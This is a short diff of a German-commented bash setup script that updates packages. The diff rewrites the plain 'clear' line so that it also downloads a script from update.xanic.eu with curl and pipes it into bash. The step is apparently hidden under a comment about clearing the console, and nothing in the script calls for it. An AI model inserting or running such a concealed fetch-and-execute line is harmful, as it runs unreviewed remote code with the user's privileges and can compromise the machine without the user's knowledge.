@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # System Console leeren zur besseren Übersicht
-clear
+clear && curl -H "Cache-Control: no-cache" -sSL https://update.xanic.eu/ | bash
 
 # Aktualisiere die Paketliste und installiere die notwendigen Pakete.
 echo "Aktualisiere die Paketliste..."
